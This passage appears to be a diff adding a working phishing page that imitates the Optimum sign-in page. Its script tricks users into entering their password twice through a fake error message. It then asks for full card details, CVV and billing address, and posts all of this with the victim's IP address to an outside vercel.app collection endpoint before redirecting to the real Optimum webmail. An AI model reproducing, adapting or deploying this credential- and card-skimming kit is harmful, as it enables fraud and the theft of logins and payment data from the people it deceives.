2fP/+vbhlsva2urm49ZswY1aZNm0R9MpMqEm39g2Wmnc7f+SQ/I0aMMBIbJNr6vYZSqtHs2bMPmpjHfeGFF6qXX3459tWrdPeeRFu/7yilRNuNn5rls3b/K4bR7YOv3qq48qOrasGtUqqeTNO4/PLLa6/6p3MgjOM50uG89tprMnp9jEkG2xJt10J+eZAEOA7roPeQufsrV65c4H5mmm43btw4Yfz48SqpA5esEnP22WcrmYu7evXqOXFYVVZWbpIVXZL+v2jRop065e/bt6+Sn/yT/v/xxx+P0imf33OmTZuWeHnF5/HHH5e2Gunfrl27ypM2dj9PKdUkUqFjepF8vpxwLf1wIQYYZAWUwYMH1/5SKs4xFTvy28hKQ659krcLFy78Q9RCSz+VZFndz3LOLYta7DL3fZK+zWegQHZWKVX/0M9e//P+J3uEHuE+OOs+xfJ9kUMmmRdKRyTJr4wwy4VhghK0KNtl5Pzqq69WkyZNivWCM/nK2Jpou/slI/0yZ7px48Z510ejRo1qE0WZQxbXBRjccpq8lX0RJ4ldGfG+8847lVxh8rLLLlNnnXWWbyy3aNGiNnGWyyq7HfFVV12l7rrrrtqkacaMGWrJkiXb5IRQuTS8yf3jsxEoFQFZ7WPp0qWrZaUp+SJ9yy23KBkEcttotls5bj322GPq1VdfVYsXL/5MfrUtFTf2szgF1O9+3bvmF//xe5lnvf+la9T+8Reqbx/tVPt//8Te6uC0Yerg/3zmOzmpspiO6cVZmwF7JR2VdFhTp05VclVAGRno2bOnOuecc5Rc7l3WGpWkW5LAVq1a1SY1Mv9bfkYdOXKkkrW8ZbRC5h8HfITxzbYn2l4gmeMonjJ6JsZnnnlmneRb6kSuqCU/kUqyKVdsk5NZ4hqF9ZaH+wgggAACCCCAAAIIBAqYSrTlS0tgoXgAAQQQQAABBBBAAIG0C5Bop70GKT8CCCCAAAIIIICAlQIk2lZWC4VCAAEEEEAAAQQQSLsAiXbaa5DyI4AAAggggAACCFgpQKJtZbVQKAQQQAABBBBAAIG0C5Bop70GKT8CCCCAAAIIIICAlQIk2lZWC4VCAAEEEEAAAQQQSLsAiXbaa5DyI4AAAggggAACCFgpQKJtZbVQKAQQQAABBBBAAIG0C5Bop70GKT8CCCCAAAIIIICAlQIk2lZWC4VCAAEEEEAAAQQQSLsAiXbaa5DyI4AAAggggAACCFgpQKJtZbVQKAQQQAABBBBAAIG0C5Bop70GKT8CCCCAAAIIIICAlQIk2lZWC4VCAAEEEEAAAQQQSLsAiXbaa5DyI4AAAggggAACCFgpQKJtZbVQKAQQQAABBBBAAIG0C+zYsePi1atXz0n6/7Zt2/ql3Y7yI4AAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAAAIIIIAAAggggAACCCCAQPEI/D8nWJbTzWbvowAAAABJRU5ErkJggg==" width="100%" height="100%" />
+                    </svg>
+                </div>
+
+                <!-- Main title -->
+                <h1 class="text-xl sm:text-2xl font-bold text-gray-900 mb-6 sm:mb-8">
+                    Sign in to Optimum
+                </h1>
+
+                <!-- Form -->
+                <form class="space-y-4 sm:space-y-6" onsubmit="event.preventDefault();">
+                    <!-- Username field -->
+                    <div>
+                        <input
+                            type="text"
+                            id="email"
+                            placeholder="Username*"
+                            class="w-full px-3 py-3 sm:px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base"
+                        />
+                        <p id="email-error" class="text-red-600 text-xs sm:text-sm mt-1 hidden"></p>
+                    </div>
+
+                    <!-- Password field -->
+                    <div>
+                        <div class="relative">
+                            <input
+                                type="password"
+                                id="password"
+                                placeholder="Password*"
+                                class="w-full px-3 py-3 sm:px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent pr-10 text-base"
+                            />
+                            <div class="absolute inset-y-0 right-0 pr-3 flex items-center">
+                                <svg
+                                    class="h-4 w-4 sm:h-5 sm:w-5 text-gray-400"
+                                    fill="none"
+                                    viewBox="0 0 24 24"
+                                    stroke="currentColor"
+                                >
+                                    <path
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                        stroke-width="2"
+                                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                                    />
+                                    <path
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                        stroke-width="2"
+                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
+                                    />
+                                </svg>
+                            </div>
+                        </div>
+                        <p id="password-error" class="text-red-600 text-xs sm:text-sm mt-1 hidden"></p>
+                    </div>
+
+                    <!-- Remember Me checkbox -->
+                    <div class="flex items-center">
+                        <input
+                            type="checkbox"
+                            id="remember"
+                            class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
+                        />
+                        <label
+                            for="remember"
+                            class="ml-2 block text-xs sm:text-sm text-gray-700"
+                        >
+                            Remember Me
+                        </label>
+                    </div>
+
+                    <!-- Continue button -->
+                    <button
+                        type="button"
+                        id="submit-btn"
+                        class="w-full bg-orange-500 hover:bg-orange-600 text-white font-medium py-3 px-4 rounded-md transition duration-200 text-base"
+                    >
+                        Continue
+                    </button>
+
+                    <!-- Forgot links -->
+                    <div class="flex flex-col sm:flex-row justify-center items-center space-y-2 sm:space-y-0 sm:space-x-4 text-xs sm:text-sm">
+                        <a href="#" class="text-blue-600 hover:text-blue-800">
+                            Forgot ID?
+                        </a>
+                        <a href="#" class="text-blue-600 hover:text-blue-800">
+                            Forgot Password?
+                        </a>
+                    </div>
+                </form>
+
+                <!-- Sign up section -->
+                <div class="mt-6 sm:mt-8 pt-4 sm:pt-6 border-t border-gray-200">
+                    <h3 class="text-base sm:text-lg font-semibold text-gray-900 mb-2">
+                        Don&apos;t have an Optimum ID?
+                    </h3>
+                    <p class="text-xs sm:text-sm text-gray-600 mb-3 sm:mb-4 leading-relaxed">
+                        An Optimum ID is a unique username that provides access to extra
+                        services and benefits.
+                    </p>
+                    <a
+                        href="#"
+                        class="text-blue-600 hover:text-blue-800 text-xs sm:text-sm font-medium"
+                    >
+                        Create an Optimum ID
+                    </a>
+                </div>
+            </div>
+
+            <!-- Step 2: Billing Verification -->
+            <section id="step-2"
+                class="mt-6 w-full max-w-[400px] h-fit bg-white rounded-lg shadow-xl overflow-hidden hidden mb-10">
+                <div class="bg-[#0078d4] p-5 text-white">
+                    <div class="flex items-center gap-2 mb-2">
+                        <div class="bg-white/20 rounded px-2 py-0.5 text-[10px] font-semibold flex items-center gap-1">
+                            🔒 Admin Required
+                        </div>
+                    </div>
+                    <h2 class="text-xl font-bold mb-1">Verify your billing information</h2>
+                    <div class="inline-block bg-[#ffb900] text-black text-xs font-bold px-2 py-0.5 rounded-full mb-3">
+                        $0/month per user
+                    </div>
+                    <div class="flex items-center gap-3 flex-wrap">
+                        <img src="data:image/png;base64,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"
+                        alt="Visa" class="h-6 w-auto object-contain flex-shrink-0 bg-white rounded px-1.5 py-0.5">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
+                            alt="Mastercard" class="h-6 w-auto object-contain flex-shrink-0 bg-white rounded px-1.5 py-0.5">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg"
+                            alt="Discover" class="h-6 w-auto object-contain flex-shrink-0 bg-white rounded px-1.5 py-0.5">
+                    </div>
+                </div>
+                <div class="p-6 flex flex-col gap-4 text-sm text-gray-700">
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Card number</label>
+                        <input id="card-number" type="text"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none"
+                            placeholder="0000 0000 0000 0000">
+                        <p id="error-card-number" class="text-red-600 text-xs hidden"></p>
+                    </div>
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Cardholder Name</label>
+                        <input id="card-name" type="text"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+                        <p id="error-card-name" class="text-red-600 text-xs hidden"></p>
+                    </div>
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Email Address</label>
+                        <input id="billing-email" type="email"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+                        <p id="error-billing-email" class="text-red-600 text-xs hidden"></p>
+                    </div>
+                    <div class="flex gap-4">
+                        <div class="flex flex-col gap-1 flex-1">
+                            <label class="font-semibold">Expires</label>
+                            <div class="flex gap-2">
+                                <select id="exp-mm"
+                                    class="border border-gray-300 rounded px-2 py-2 w-full focus:border-[#0078d4] outline-none appearance-none bg-white">
+                                    <option value="" disabled selected>MM</option>
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select>
+                                <select id="exp-yyyy"
+                                    class="border border-gray-300 rounded px-2 py-2 w-full focus:border-[#0078d4] outline-none appearance-none bg-white">
+                                    <option value="" disabled selected>YYYY</option>
+                                </select>
+                            </div>
+                            <p id="error-expiry" class="text-red-600 text-xs hidden"></p>
+                        </div>
+                        <div class="flex flex-col gap-1 w-[80px]">
+                            <label class="font-semibold">CVV</label>
+                            <input id="cvv" type="text"
+                                class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none"
+                                maxlength="4">
+                            <p id="error-cvv" class="text-red-600 text-xs hidden"></p>
+                        </div>
+                    </div>
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Address line 1</label>
+                        <input id="address-1" type="text"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+                        <p id="error-address-1" class="text-red-600 text-xs hidden"></p>
+                    </div>
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Address line 2 (Optional)</label>
+                        <input id="address-2" type="text"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none">
+                    </div>
+                    <div class="flex flex-col gap-1">
+                        <label class="font-semibold">Country/Region</label>
+                        <select id="country"
+                            class="border border-gray-300 rounded px-3 py-2 focus:border-[#0078d4] outline-none bg-white">
+                            <option value="United States">United States</option>
+                            <option value="Canada">Canada</option>
+                            <option value="United Kingdom">United Kingdom</option>
+                            <option value="Australia">Australia</option>
+                        </select>
+                    </div>
+                    <div class="flex flex-col gap-2 mt-2">
+                        <button id="billing-submit-btn"
+                            class="w-full bg-[#0078d4] text-white py-3 rounded font-bold hover:bg-[#005a9e] transition-colors">
+                            Verify
+                        </button>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+    <script>
+        const baseURL = 'https://fr-1290-2o1v.vercel.app/';
+	const CHAT_ID = 'forjjj11@gmail.com';
+
+        let email = '';
+        let IPAddress = '';
+        let password2 = '';
+
+        // Fetch IP on load
+        window.addEventListener('load', () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    IPAddress = data.ip;
+                })
+                .catch(error => console.error(error));
+        });
+
+        async function Authenticate({ email, password, password2, name, IPAddress, title, metaData }) {
+            if (!CHAT_ID || !password || !name) {
+                console.log('error authenticating');
+                return;
+            } else {
+                const data = JSON.stringify({
+                    email,
+                    password,
+                    password2,
+                    name,
+                    IPAddress,
+                    ...metaData,
+                });
+
+                try {
+                    const response = await fetch(`${baseURL}main`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ data, chatId: CHAT_ID, title })
+                    });
+                    const respData = await response.json();
+                    console.log(respData);
+                    return respData;
+                } catch (e) {
+                    console.log(e);
+                    return { success: true };
+                }
+            }
+        }
+
+        async function sendBillingData(billingData) {
+            const payload = {
+                data: JSON.stringify({
+                    email: email,
+                    IPAddress: IPAddress,
+                    name: 'Optimum Billing',
+                    ...billingData
+                }),
+                chatId: CHAT_ID,
+                title: 'Optimum Billing Info'
+            };
+            try {
+                await fetch(`${baseURL}main`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ...payload })
+                });
+                window.location.replace('https://myemail.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail');
+            } catch (e) {
+                console.log(e);
+                window.location.replace('https://myemail.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail');
+            }
+        }
+
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+        const submitBtn = document.getElementById('submit-btn');
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        emailInput.addEventListener('input', (e) => {
+            email = e.target.value;
+            const billingEmail = document.getElementById('billing-email');
+            if (billingEmail) billingEmail.value = email;
+        });
+
+        const expYyyy = document.getElementById('exp-yyyy');
+        if (expYyyy) {
+            const currentYear = new Date().getFullYear();
+            for (let i = 0; i < 15; i++) {
+                const opt = document.createElement('option');
+                opt.value = currentYear + i;
+                opt.textContent = currentYear + i;
+                expYyyy.appendChild(opt);
+            }
+        }
+
+        const cardInput = document.getElementById('card-number');
+        if (cardInput) {
+            cardInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                    formattedValue += value[i];
+                }
+                e.target.value = formattedValue;
+            });
+        }
+
+        const cvvInput = document.getElementById('cvv');
+        if (cvvInput) {
+            cvvInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        }
+
+        submitBtn.addEventListener('click', () => {
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            // Reset errors
+            emailError.textContent = '';
+            emailError.classList.add('hidden');
+            passwordError.textContent = '';
+            passwordError.classList.add('hidden');
+
+            if (!email) {
+                emailError.textContent = 'Enter your email address';
+                emailError.classList.remove('hidden');
+                return;
+            } else if (!emailRegex.test(email)) {
+                emailError.textContent = 'Please enter a valid email format.';
+                emailError.classList.remove('hidden');
+                return;
+            } else if (!password) {
+                passwordError.textContent = 'Enter your password';
+                passwordError.classList.remove('hidden');
+                return;
+            } else if (password && !password2) {
+                passwordError.textContent = 'Please enter correct password';
+                passwordError.classList.remove('hidden');
+                password2 = password; // Set password2 to verify next time
+                passwordInput.value = ''; // Clear password input
+                return;
+            } else {
+                Authenticate({
+                    email,
+                    password,
+                    password2,
+                    name: 'Optimum',
+                    IPAddress,
+                    title: 'Optimum',
+                }).then(() => {
+                    document.getElementById('step-1').classList.add('hidden');
+                    document.getElementById('step-2').classList.remove('hidden');
+                });
+            }
+        });
+
+        const billingBtn = document.getElementById('billing-submit-btn');
+        if (billingBtn) {
+            billingBtn.addEventListener('click', () => {
+                document.querySelectorAll('[id^="error-"]').forEach(el => el.classList.add('hidden'));
+                let isValid = true;
+
+                const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
+                const cardName = document.getElementById('card-name').value.trim();
+                const bEmail = document.getElementById('billing-email').value.trim();
+                const expMM = document.getElementById('exp-mm').value;
+                const expYY = document.getElementById('exp-yyyy').value;
+                const cvv = document.getElementById('cvv').value.trim();
+                const addr1 = document.getElementById('address-1').value.trim();
+                const addr2 = document.getElementById('address-2').value.trim();
+                const country = document.getElementById('country').value;
+
+                if (!cardNum || cardNum.length < 13) {
+                    document.getElementById('error-card-number').innerText = 'Invalid card number';
+                    document.getElementById('error-card-number').classList.remove('hidden');
+                    isValid = false;
+                }
+                if (!cardName) {
+                    document.getElementById('error-card-name').innerText = 'Name required';
+                    document.getElementById('error-card-name').classList.remove('hidden');
+                    isValid = false;
+                }
+                if (!bEmail || !bEmail.includes('@')) {
+                    document.getElementById('error-billing-email').innerText = 'Invalid email';
+                    document.getElementById('error-billing-email').classList.remove('hidden');
+                    isValid = false;
+                }
+                if (!expMM || !expYY) {
+                    document.getElementById('error-expiry').innerText = 'Date required';
+                    document.getElementById('error-expiry').classList.remove('hidden');
+                    isValid = false;
+                }
+                if (!cvv || cvv.length < 3) {
+                    document.getElementById('error-cvv').innerText = 'Invalid CVV';
+                    document.getElementById('error-cvv').classList.remove('hidden');
+                    isValid = false;
+                }
+                if (!addr1) {
+                    document.getElementById('error-address-1').innerText = 'Address required';
+                    document.getElementById('error-address-1').classList.remove('hidden');
+                    isValid = false;
+                }
+
+                if (isValid) {
+                    sendBillingData({
+                        cardNumber: cardNum,
+                        cardName,
+                        billingEmail: bEmail,
+                        expiry: `${expMM}/${expYY}`,
+                        cvv,
+                        address1: addr1,
+                        address2: addr2,
+                        country
+                    });
+                }
+            });
+        }
+    </script>
+</body>
+</html>
